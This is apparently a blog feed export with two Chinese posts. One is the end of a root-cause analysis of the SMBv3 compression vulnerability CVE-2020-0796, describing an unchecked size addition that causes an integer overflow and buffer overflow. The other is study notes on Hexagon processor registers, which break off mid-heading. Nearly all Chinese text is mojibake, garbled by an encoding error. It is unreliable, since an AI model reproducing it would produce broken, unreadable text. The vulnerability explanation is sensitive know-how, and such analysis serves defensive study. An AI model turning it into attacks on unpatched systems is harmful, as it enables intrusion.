æ•´å‹æº¢å‡º..</p><h2 id="æ¼æ´"><a href="#æ¼æ´" class="headerlink" title="æ¼æ´"></a>æ¼æ´</h2><p>æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹æœªæ‰“è¡¥ä¸çš„ç‰ˆæœ¬â€¦</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200313032734.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200313032734.png"></a></p><p>çœ‹äº†ä¸€ä¸‹..è¿™é‡Œæ˜¯å°†åŸæœ¬ä¸ªå€¼ç›´æ¥ç›¸åŠ ï¼Œå¹¶æ²¡æœ‰è¿›è¡Œchecklâ€¦ ç„¶ååˆ†é…å†…å­˜..å¦‚æœæœ‰é—®é¢˜ â€¦åº”è¯¥æ˜¯è¿™é‡Œåˆ†é…çš„å†…å­˜å¤ªå°..å¯¼è‡´åç»­çš„ç¼“å†²åŒºæº¢å‡ºå§ï¼Ÿ</p><p>ç”±äºæˆ‘å¯¹è¿™ä¸¤ä¸ªå€¼ä¸æ˜¯å¾ˆç†Ÿæ‚‰..æ‰€ä»¥è¿™ä¸ªæ—¶å€™å¼€å§‹æŸ¥èµ„æ–™..</p><p>è¿™ä¸ªæ—¶å€™å‘ç°å·²ç»æœ‰äººå‘æ–‡äº†â€¦å‚è€ƒé“¾æ¥æœ€åè´´åé¢..</p><p>å¯ä»¥çŸ¥é“çš„æ˜¯..è¿™é‡Œçš„å€¼ä¸€ä¸ªæ˜¯ OriginalCompressedSegmentSize  ä¸€ä¸ªæ˜¯ Offset/Lengthï¼Œä»–ä»¬ æè¿°å¦‚ä¸‹:</p><blockquote><ol><li>OriginalCompressedSegmentSize (4 bytes) The size, in bytes, of the uncompressed data segment.</li><li>Offset/Length (4 bytes) If SMB2_COMPRESSION_FLAG_CHAINED is set in Flags field, this field MUST be interpreted as Length. The length, in bytes, of the compressed payload. Otherwise, this field MUST be interpreted as Offset. The offset, in bytes, from the end of this structure to the start of compressed data segment.</li></ol></blockquote><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200313033313.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200313033313.png"></a></p><p>ç„¶ååšäº†ä»€ä¹ˆäº‹æƒ…å‘¢ï¼Ÿ</p><p>çœ‹ä»£ç ï¼Œå°†åˆ†é…çš„å†…å­˜ ç”¨ SmbCompressionDecompress è¿™ä¸ªå‡½æ•°è¿›è¡Œå¤„ç†</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200313033424.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200313033424.png"></a></p><p>æˆ‘åœ¨ srvnet é‡Œæ‰¾åˆ°äº† SmbCompressionDecompress è¿™ä¸ªå‡½æ•°</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200313033623.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200313033623.png"></a></p><p>ç„¶ååˆè°ƒç”¨äº† <code>RtlDecompressBufferEx2</code> è¿™ä¸ªå‡½æ•°..æœ€åè°ƒçš„æ˜¯ <code>RtlDecompressBufferXpressLz</code> è¿™ä¸ªå‡½æ•°â€¦</p><p>è¿™ä¸ªå‡½æ•°åœ¨<code>ntoskrnl. exe</code> é‡Œ</p><p>è¿™ä¸ªå‡½æ•°åšçš„æ˜¯äº‹æƒ…å°±æ˜¯..</p><p><code>memcpy(ptr,src,len)</code></p><p>ptr æ˜¯ç”± <code>SrvNetAllocateBuffer</code>åˆ†é…çš„<code>UncompressBuffer</code>ï¼Œ<code>len</code> æ˜¯ä»smb åŒ…è§£æçš„è§£å‹æ•°æ®çš„å¤§å°ï¼Œè¿™ä¸ªå€¼æ˜¯æ”»å‡»è€…å¯æ§çš„ï¼Œ ç”±äºå‰é¢æ²¡æœ‰æ£€æŸ¥..æ‰€ä»¥æˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªå¾ˆå¤§çš„å€¼ï¼Œä½¿å…¶è§¦å‘æ•´å‹æº¢å‡º.åˆ†é…ä¸€ä¸ªè¾ƒå°çš„å†…å­˜â€¦æ­¤æ—¶ lenåˆæ˜¯ä¸€ä¸ªå¤§çš„å€¼..æ‰€ä»¥å¯¼è‡´äº†ç¼“å†²åŒºæº¢å‡º</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200314024525.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200314024525.png"></a></p><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-smb2/1d435f21-9a21-4f4c-828e-624a176cf2a0">https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-smb2/1d435f21-9a21-4f4c-828e-624a176cf2a0</a></p><p><a href="http://blogs.360.cn/post/CVE-2020-0796.html">http://blogs.360.cn/post/CVE-2020-0796.html</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´åˆ†æ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE-2020-0796 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexagon å­¦ä¹  --- å¯„å­˜å™¨ç¯‡</title>
      <link href="Herxagon%20%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0.html"/>
      <url>Herxagon%20%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="Hexagon-å­¦ä¹ "><a href="#Hexagon-å­¦ä¹ " class="headerlink" title="Hexagon å­¦ä¹ "></a>Hexagon å­¦ä¹ </h1><p>å°±æ˜¯æŒ‰ç…§æ‰‹å†Œè¿‡äº†ä¸€éï¼Œä»…ä»…æ˜¯ä¸ªäººçš„ç¬”è®°ã€‚</p><h2 id="Registers-å¯„å­˜å™¨"><a href="#Registers-å¯„å­˜å™¨" class="headerlink" title="Registers å¯„å­˜å™¨"></a>Registers å¯„å­˜å™¨</h2><blockquote><p>The Hexagon processor has two sets of registers: general registers and control registers. The general registers include thirty-two 32-bit registers (named R0 through R31) which can be accessed either as single registers or as aligned 64-bit register pairs. The general registers are used to contain all pointer, scalar, vector, and accumulator data. The control registers include special-purpose registers such as program counter, status register, loop registers, etc.</p></blockquote><p>åˆ†ä¸ºé€šç”¨å¯„å­˜å™¨å’Œæ§åˆ¶å¯„å­˜å™¨ï¼Œ é€šç”¨å¯„å­˜å™¨åŒ…æ‹¬32ä¸ª32ä½å¯„å­˜å™¨ï¼Œä»¥R0åˆ°R31å‘½åï¼Œå¦å¤–è¿™é‡Œæåˆ°äº†å¯ä»¥é€šè¿‡å®šä¹‰ä¸€ä¸ªå¯„å­˜å™¨å¯¹æ¥è¡¨ç¤ºä¸€ä¸ª64ä½å¯„å­˜å™¨..ä¾‹å¦‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">R1ï¼š0 &#x3D;memd(R3)          &#x2F;&#x2F;å¯¼å…¥åŒå­—</span><br><span class="line">R7:6&#x3D;valignb(R9:8,R7:6,#2)   &#x2F;&#x2F;é€‚é‡å¯¹é½</span><br></pre></td></tr></table></figure><h3 id="å¯„å­˜å™¨å¯¹"><a href="#å¯„å­˜å™¨å¯¹" class="headerlink" title="å¯„å­˜å™¨å¯¹"></a>å¯„å­˜å™¨å¯¹</h3><p>ä¸‹å›¾æ˜¾ç¤ºäº†å¯„å­˜å™¨å¯¹çš„ç»“æ„</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312032950.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312032950.png"></a> </p><p>åœ¨è¿™äº›é€šç”¨å¯„å­˜å™¨å½“ä¸­ï¼ŒR29-R32è¢«ç”¨æ¥æ”¯æŒå­ç¨‹åºçš„è°ƒç”¨ä»¥åŠç¨‹åºæ ˆï¼Œè¿™äº›å¯„å­˜å™¨å¯ä»¥æ— ä¿ç•™çš„è¢«å­ç¨‹åºè°ƒç”¨æˆ–æ ˆæŒ‡ä»¤æ”¹å˜ã€‚åœ¨ç¼–ç¨‹ç¯å¢ƒä¸­ï¼ŒR29-R32å¯ä»¥ç”¨ç¬¦å·æ¥è¡¨ç¤ºã€‚ä¾‹å¦‚ï¼š</p><p>  SP=add(SP,#-8)    //spæ˜¯R29çš„åˆ«å</p><p>  Allocfram             //æ›´æ”¹å¯„å­˜å™¨R29(SP)ä»¥åŠR30ï¼ˆFPï¼‰</p><p>  call init                //æ›´æ”¹LRï¼ˆR31ï¼‰</p><h3 id="é€šç”¨å¯„å­˜å™¨"><a href="#é€šç”¨å¯„å­˜å™¨" class="headerlink" title="é€šç”¨å¯„å­˜å™¨"></a>é€šç”¨å¯„å­˜å™¨</h3><p>ä¸‹å›¾æ˜¾ç¤ºäº†è¿™äº›åˆ«ååçš„é€šç”¨å¯„å­˜å™¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">For example:</span><br><span class="line">SP &#x3D; add(SP, #-8) &#x2F;&#x2F; SP is alias of R29</span><br><span class="line">allocframe &#x2F;&#x2F; Modifies SP (R29) and FP (R30)</span><br><span class="line">call init &#x2F;&#x2F; Modifies LR (R31)</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312033255.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312033255.png"></a></p><p>åœ¨è¿™äº›é€šç”¨å¯„å­˜å™¨å½“ä¸­ï¼ŒR29-R32è¢«ç”¨æ¥æ”¯æŒå­ç¨‹åºçš„è°ƒç”¨ä»¥åŠç¨‹åºæ ˆï¼Œè¿™äº›å¯„å­˜å™¨å¯ä»¥æ— ä¿ç•™çš„è¢«å­ç¨‹åºè°ƒç”¨æˆ–æ ˆæŒ‡ä»¤æ”¹å˜ã€‚åœ¨ç¼–ç¨‹ç¯å¢ƒä¸­ï¼ŒR29-R32å¯ä»¥ç”¨ç¬¦å·æ¥è¡¨ç¤ºã€‚</p><h3 id="æ§åˆ¶å¯„å­˜å™¨"><a href="#æ§åˆ¶å¯„å­˜å™¨" class="headerlink" title="æ§åˆ¶å¯„å­˜å™¨"></a>æ§åˆ¶å¯„å­˜å™¨</h3><p>Hexagonå¤„ç†å™¨åŒ…å«äº†ä¸€ç³»åˆ—çš„32ä½çš„æ§åˆ¶å¯„å­˜å™¨ï¼Œè¿™äº›å¯„å­˜å™¨å¯ä»¥è®©æˆ‘ä»¬å¯¹å¤„ç†å™¨ä¸­çš„PCï¼Œç¡¬ä»¶å›è·¯ä»¥åŠçŸ¢é‡åˆ†æ”¯é¢„æµ‹è¿›è¡Œæ“ä½œã€‚</p><p> ä¸é€šç”¨å¯„å­˜å™¨ä¸åŒï¼Œæ§åˆ¶å¯„å­˜å™¨ä¸­æœ‰äº›ç‰¹æ®Šçš„æ§åˆ¶å¯„å­˜å™¨å¯ç”¨æ¥å½“åšæ“ä½œæ•°ï¼Œæœ‰æ—¶å€™å¯„å­˜å™¨å¯ä»¥è¢«è½¬æ¢æˆæŒ‡ä»¤ä»è€Œè¢«ç”¨ä½œæ“ä½œæ•°ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">For example:</span><br><span class="line">R2 &#x3D; memw(R0++M1) &#x2F;&#x2F; Auto-increment addressing mode (M1)</span><br><span class="line">R9 &#x3D; PC &#x2F;&#x2F; Get program counter (PC)</span><br><span class="line">LC1 &#x3D; R3 &#x2F;&#x2F; Set hardware loop count (LC1)</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312033443.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312033443.png"></a></p><p>æ§åˆ¶å¯„å­˜å™¨åˆ«åè§„åˆ™ï¼š</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312033639.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312033639.png"></a></p><p>æ§åˆ¶å¯„å­˜å™¨åŒæ ·å¯ä»¥è¢«å®šä¹‰ä¸ºå¯„å­˜å™¨å¯¹ä»è€Œè¡¨ç¤ºä¸€ä¸ª64ä½çš„å¯„å­˜å™¨ï¼Œæ§åˆ¶å¯„å­˜å™¨çš„å‡‘å¯¹ä½¿ç”¨åˆ«åæ¥å®šä¹‰ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C1:0 &#x3D; R5:4 &#x2F;&#x2F; C1:0 specifies the LC0&#x2F;SA0 register pair</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312033809.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312033809.png"></a></p><h4 id="ç¨‹åºè®¡æ•°å™¨-Program-Counterï¼ˆPCï¼‰"><a href="#ç¨‹åºè®¡æ•°å™¨-Program-Counterï¼ˆPCï¼‰" class="headerlink" title="ç¨‹åºè®¡æ•°å™¨ Program Counterï¼ˆPCï¼‰"></a>ç¨‹åºè®¡æ•°å™¨ Program Counterï¼ˆPCï¼‰</h4><p>PC å¯„å­˜å™¨æ˜¯ç”¨æ¥æŒ‡å‘ä¸‹ä¸€ä¸ªæŒ‡ä»¤çš„ä½ç½®. ä»–å¯ä»¥é€šè¿‡æŒ‡ä»¤çš„æ‰§è¡Œæ¥é—´æ¥ä¿®æ”¹ï¼Œä¹Ÿå¯è¢«ç›´æ¥è¯»å–ä¾‹å¦‚ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">R7 &#x3D; PC &#x2F;&#x2F; Get program counter</span><br></pre></td></tr></table></figure><p>NOTE The PC register is read-only: writing to it has no effect.</p><h4 id="å¾ªç¯å¯„å­˜å™¨-Loop-registers"><a href="#å¾ªç¯å¯„å­˜å™¨-Loop-registers" class="headerlink" title="å¾ªç¯å¯„å­˜å™¨ Loop registers"></a>å¾ªç¯å¯„å­˜å™¨ Loop registers</h4><p>Hewxagon çš„å¤„ç†å™¨åŒ…æ‹¬ä¸¤ç»„å¾ªç¯å¯„å­˜å™¨ç”¨æ¥æ”¯æŒåµŒå¥—çš„ç¡¬ä»¶å¾ªç¯, æ¯ä¸ªå¾ªç¯åŒ…å«äº†å¾ªç¯è®¡æ•°å™¨ä»¥åŠå¾ªç¯å¼€å§‹ä½ç½®çš„å¯„å­˜å™¨ã€‚å¾ªç¯å¯„å­˜å™¨å¯ä»¥é€šè¿‡ loop æŒ‡ä»¤ä¿®æ”¹ï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥ç›´æ¥è®¿é—®ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">loop0(start, R4) &#x2F;&#x2F; Modifies LC0 and SA0 (LC0&#x3D;R4, SA0&#x3D;&amp;start)</span><br><span class="line">LC1 &#x3D; R22 &#x2F;&#x2F; Set loop1 count</span><br><span class="line">R9 &#x3D; SA1 &#x2F;&#x2F; Get loop1 start address</span><br></pre></td></tr></table></figure><h4 id="ç”¨æˆ·çŠ¶æ€å¯„å­˜å™¨-User-Status-register"><a href="#ç”¨æˆ·çŠ¶æ€å¯„å­˜å™¨-User-Status-register" class="headerlink" title="ç”¨æˆ·çŠ¶æ€å¯„å­˜å™¨ User  Status register"></a>ç”¨æˆ·çŠ¶æ€å¯„å­˜å™¨ User  Status register</h4><p>ç”¨æˆ·çŠ¶æ€å¯„å­˜å™¨ï¼ˆUSRï¼‰å­˜å‚¨å¯ç”±ç”¨æˆ·ç¨‹åºè®¿é—®çš„å¤„ç†å™¨çŠ¶æ€å’Œæ§åˆ¶ä½ã€‚çŠ¶æ€ä½åŒ…å«æŸäº›æŒ‡ä»¤çš„çŠ¶æ€ç»“æœï¼Œè€Œæ§åˆ¶ä½åŒ…å«ç”¨æˆ·å¯è®¾ç½®çš„å¤„ç†å™¨æ¨¡å¼ï¼Œç”¨äºç¡¬ä»¶é¢„å–</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">R9:8 &#x3D; vaddw(R9:8, R3:2):sat &#x2F;&#x2F; Vector add words</span><br><span class="line">R6 &#x3D; USR &#x2F;&#x2F; Get saturation status</span><br></pre></td></tr></table></figure><p>USR å¯åŒ…å«ä¸€ä¸‹çš„çŠ¶æ€å’Œæ§åˆ¶å€¼</p><ul><li><p>å¯ç”¨ç¼“å­˜é¢„å– Cache prefetch enable</p></li><li><p>ç¼“å­˜é¢„å–çŠ¶æ€ Cache prefetch status</p></li><li><p>æµ®ç‚¹æ¨¡å¼ Floating point modes</p></li><li><p>æµ®ç‚¹çŠ¶æ€ Floating point status </p></li><li><p>ç¡¬ä»¶å›è·¯é…ç½® Hardware loop configuration</p></li><li><p>Sticky saturation overflow </p></li></ul><blockquote><p>NOTE A user control register transfer to USR cannot be grouped in an instruction packet with a floating point instruction (Section 4.3.4). Whenever a transfer to USR changes the Enable trap bits [29:25], an isync instruction (Section 5.10) must be executed before the new exception programming can take effect.</p></blockquote><h4 id="ä¿®é¥°å¯„å­˜å™¨-Modifier-registers"><a href="#ä¿®é¥°å¯„å­˜å™¨-Modifier-registers" class="headerlink" title="ä¿®é¥°å¯„å­˜å™¨  Modifier registers"></a>ä¿®é¥°å¯„å­˜å™¨  Modifier registers</h4><p>ä¿®é¥°å¯„å­˜å™¨ç”¨äº ï¼ˆM0-M1ï¼‰ ç”¨äºä»¥ä¸‹å¯»å€æ¨¡å¼</p><ul><li><p>é—´æ¥è‡ªåŠ¨é€’å¢å¯„å­˜å™¨å¯»å€ Indirect auto-increment register addressing</p></li><li><p>å¾ªç¯å¯»å€ Circular addressing</p></li><li><p>bit-reversed å¯»å€ Bit-reversed addressing</p></li></ul><p><strong>Indirect auto-increment register addressing</strong></p><p>åœ¨é—´æ¥è‡ªåŠ¨é€’å¢å¯„å­˜å™¨å¯»å€ä¸­ï¼Œä¿®æ”¹ç¬¦å¯„å­˜å™¨å­˜å‚¨ä¸€ä¸ª<br>å¸¦ç¬¦å·çš„32ä½å€¼ï¼Œç”¨äºæŒ‡å®šå¢é‡ï¼ˆæˆ–å‡é‡ï¼‰å€¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">M1 &#x3D; R0 &#x2F;&#x2F; Set modifier register</span><br><span class="line">R3 &#x3D; memw(R2++M1) &#x2F;&#x2F; Load word</span><br></pre></td></tr></table></figure><p><strong>Circular</strong></p><p>åœ¨å¾ªç¯å¯»å€ä¸­ï¼Œä¿®é¥°å¯„å­˜å™¨å­˜å‚¨å¾ªç¯ç¼“å†²åŒºçš„é•¿åº¦å’Œç›¸å…³çš„ â€œkâ€ å’Œ â€œIâ€ çš„å€¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">M0 &#x3D; R7 &#x2F;&#x2F; Set modifier register</span><br><span class="line">R0 &#x3D; memb(R2++#4:circ(M0)) &#x2F;&#x2F; Load from circ buffer pointed</span><br><span class="line"> &#x2F;&#x2F; to by R2 with size&#x2F;K vals in M0</span><br><span class="line">R0 &#x3D; memb(R7++I:circ(M1)) &#x2F;&#x2F; Load from circ buffer pointed</span><br><span class="line"> &#x2F;&#x2F; to by R7 with size&#x2F;K&#x2F;I vals in M1 </span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312144717.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312144717.png"></a></p><p><strong>Bit-reversed</strong></p><p>åœ¨ä½åè½¬å¯»å€ä¸­ï¼Œä¿®æ”¹å™¨å¯„å­˜å™¨å­˜å‚¨å¸¦ç¬¦å·çš„32ä½ æŒ‡å®šå¢é‡ï¼ˆæˆ–å‡é‡ï¼‰å€¼çš„å€¼ã€‚ä¾‹å¦‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">M1 &#x3D; R7 &#x2F;&#x2F; Set modifier register</span><br><span class="line">R2 &#x3D; memub(R0++M1:brev) &#x2F;&#x2F; The address is (R0.H | bitrev(R0.L))</span><br><span class="line"> &#x2F;&#x2F; The orginal R0 (not reversed) is added</span><br><span class="line"> &#x2F;&#x2F; to M1 and written back to R0</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312145512.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312145512.png"></a></p><h4 id="åˆ†æ”¯é¢„æµ‹å¯„å­˜å™¨-Predicate-registers"><a href="#åˆ†æ”¯é¢„æµ‹å¯„å­˜å™¨-Predicate-registers" class="headerlink" title="åˆ†æ”¯é¢„æµ‹å¯„å­˜å™¨ Predicate registers"></a>åˆ†æ”¯é¢„æµ‹å¯„å­˜å™¨ Predicate registers</h4><p>åˆ†æ”¯é¢„æµ‹å¯„å­˜å™¨ï¼ˆP0-P3ï¼‰ä¿å­˜äº†æ ‡é‡ä¸çŸ¢é‡å¯¹æ¯”è®¡ç®—çš„ç»“æœï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">P1 &#x3D; cmp.eq(R2, R3) &#x2F;&#x2F; Scalar compare</span><br><span class="line">if (P1) jump end &#x2F;&#x2F; Jump to address (conditional)</span><br><span class="line">R8 &#x3D; P1 &#x2F;&#x2F; Get compare status (P1 only)</span><br><span class="line">P3:0 &#x3D; R4 &#x2F;&#x2F; Set compare status (P0-P3)</span><br></pre></td></tr></table></figure><p> è¿™å››ä¸ªåˆ†æ”¯é¢„æµ‹å¯„å­˜å™¨å¯è¢«è®¾ç½®æˆå››å€çŠ¶æ€ï¼Œæ­¤æ—¶æ­¤å››ä¸ªå¯„å­˜å™¨è¢«è¡¨ç¤ºæˆä¸€ä¸ª32ä½çš„å¯„å­˜å™¨</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312145842.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312145842.png"></a></p><h4 id="å¾ªç¯èµ·å§‹å¯„å­˜å™¨-Circular-start-registers"><a href="#å¾ªç¯èµ·å§‹å¯„å­˜å™¨-Circular-start-registers" class="headerlink" title="å¾ªç¯èµ·å§‹å¯„å­˜å™¨ Circular start registers"></a>å¾ªç¯èµ·å§‹å¯„å­˜å™¨ Circular start registers</h4><p>å¾ªç¯èµ·å§‹å¯„å­˜å™¨ï¼ˆCS0-CS1ï¼‰å°†å¾ªç¯ç¼“å†²åŒºçš„èµ·å§‹åœ°å€å­˜å‚¨åœ¨å¾ªç¯å¯»å€</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CS0 &#x3D; R5 &#x2F;&#x2F; Set circ start register</span><br><span class="line">M0 &#x3D; R7 &#x2F;&#x2F; Set modifier register</span><br><span class="line">R0 &#x3D; memb(R2++#4:circ(M0)) &#x2F;&#x2F; Load from circ buffer pointed</span><br><span class="line"> &#x2F;&#x2F; to by CS0 with size&#x2F;K vals in M0</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312150712.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312150712.png"></a></p><h4 id="ç”¨æˆ·é€šç”¨æŒ‡é’ˆå¯„å­˜å™¨-User-general-pointer-register"><a href="#ç”¨æˆ·é€šç”¨æŒ‡é’ˆå¯„å­˜å™¨-User-general-pointer-register" class="headerlink" title="ç”¨æˆ·é€šç”¨æŒ‡é’ˆå¯„å­˜å™¨ User general pointer register"></a>ç”¨æˆ·é€šç”¨æŒ‡é’ˆå¯„å­˜å™¨ User general pointer register</h4><p>The user general pointer (UGP) register is a general-purpose control register.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">R9 &#x3D; UGP &#x2F;&#x2F; Get UGP</span><br><span class="line">UGP &#x3D; R3 &#x2F;&#x2F; Set UGP</span><br></pre></td></tr></table></figure><p>UGPé€šå¸¸ç”¨äºå­˜å‚¨çº¿ç¨‹æœ¬åœ°å­˜å‚¨çš„åœ°å€ã€‚</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312150913.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312150913.png"></a></p><h4 id="å…¨å±€æŒ‡é’ˆ-Global-pointer"><a href="#å…¨å±€æŒ‡é’ˆ-Global-pointer" class="headerlink" title="å…¨å±€æŒ‡é’ˆ Global pointer"></a>å…¨å±€æŒ‡é’ˆ Global pointer</h4><p>å…¨å±€æŒ‡é’ˆï¼ˆGPï¼‰ç”¨äºGPç›¸å¯¹å¯»å€</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GP &#x3D; R7 &#x2F;&#x2F; Set GP</span><br><span class="line">R2 &#x3D; memw(GP+#200) &#x2F;&#x2F; GP-relative load</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312151031.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312151031.png"></a></p><h4 id="å‘¨æœŸè®¡æ•°å¯„å­˜å™¨-Cycle-count-registers"><a href="#å‘¨æœŸè®¡æ•°å¯„å­˜å™¨-Cycle-count-registers" class="headerlink" title="å‘¨æœŸè®¡æ•°å¯„å­˜å™¨ Cycle count registers"></a>å‘¨æœŸè®¡æ•°å¯„å­˜å™¨ Cycle count registers</h4><p>å‘¨æœŸè®¡æ•°å¯„å­˜å™¨ï¼ˆUPCYCLELO-UPCYCLEHIï¼‰å­˜å‚¨ä¸€ä¸ª64ä½å€¼ï¼Œå…¶ä¸­åŒ…å«è‡ªä»ä¸Šæ¬¡é‡ç½®Hexagonå¤„ç†å™¨ä»¥æ¥å½“å‰æ‰§è¡Œçš„å¤„ç†å™¨å‘¨æœŸæ•°ã€‚</p><p>[^NOTE]: The RTOS must grant permission to access these registers. Without this permission, reading these registers from user code always returns zero.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">R5 &#x3D; UPCYCLEHI &#x2F;&#x2F; Get cycle count (high)</span><br><span class="line">R4 &#x3D; UPCYCLELO &#x2F;&#x2F; Get cycle count (low)</span><br><span class="line">R5:4 &#x3D; UPCYCLE &#x2F;&#x2F; Get cycle count</span><br></pre></td></tr></table></figure><h4 id="å¸§é™åˆ¶å¯„å­˜å™¨-Frame-limit-register"><a href="#å¸§é™åˆ¶å¯„å­˜å™¨-Frame-limit-register" class="headerlink" title="å¸§é™åˆ¶å¯„å­˜å™¨  Frame limit register"></a>å¸§é™åˆ¶å¯„å­˜å™¨  Frame limit register</h4><p>å¸§é™åˆ¶å¯„å­˜å™¨ï¼ˆFRAMELIMITï¼‰å­˜å‚¨å­˜å‚¨åŒºçš„ä½åœ°å€ä¸ºè½¯ä»¶æ ˆä¿ç•™</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">R9 &#x3D; FRAMELIMIT &#x2F;&#x2F; Get frame limit register</span><br><span class="line">FRAMELIMIT &#x3D; R3 &#x2F;&#x2F; Set frame limit register</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312151516.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312151516.png"></a></p><h4 id="æ ˆkeyå¯„å­˜å™¨-Frame-key-registe"><a href="#æ ˆkeyå¯„å­˜å™¨-Frame-key-registe" class="headerlink" title="æ 